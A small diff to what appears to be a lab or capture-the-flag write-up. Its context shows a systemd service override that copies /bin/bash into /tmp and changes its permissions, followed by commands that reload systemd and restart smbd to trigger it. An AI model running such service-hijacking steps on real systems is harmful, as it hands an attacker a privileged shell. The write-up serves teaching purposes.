@@ -350,6 +350,7 @@ echo -e '[Service]\nExecStartPre=/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 677
 ### Triggering the Payload
 
 We reload the daemon and restart the service to execute our command.
+
 ```bash
 systemctl daemon-reload
 systemctl restart smbd
